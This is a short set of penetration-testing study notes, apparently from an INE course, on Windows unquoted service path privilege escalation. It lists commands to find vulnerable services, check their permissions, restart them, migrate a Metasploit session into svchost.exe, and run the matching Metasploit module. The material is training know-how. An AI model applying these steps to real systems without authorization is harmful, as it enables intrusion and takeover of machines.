@@ -1,0 +1,37 @@
+INE-Privilege Escalation Notes
+----------------------------------------------
+
+[+] Unquoted service path
+
+=> Identify unquoted services
+	C:\Desktop> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\window\\" | findstr /i /v """
+
+=> To start or stop service
+	C:\Desktop> sc start <ServiceName>
+	C:\Desktop> sc stop <ServiceName>
+
+=> Check wheather service can run with localsystem or not
+	C:\Desktop> sc qc <ServiceName>
+
+	check for:
+
+		SERVICE_START_NAME : localsystem
+
+=> To check folder permissions
+	C:\Desktop> icacls "vmware Tools"
+
+	check for:
+
+		Authentication users: (OI)(CI)(M)
+
+=> For stable shell
+	
+	msf6 exploit(multi/handler) > set AutoRunScript migrate -n svchost.exe
+
+=> set and start the multi handler
+
+=> restart the service on windows shell
+
+=> Metasploit script for automatic unquoted service path privilege esclation
+	
+	"exploit/windows/local/unquoted_service_path"
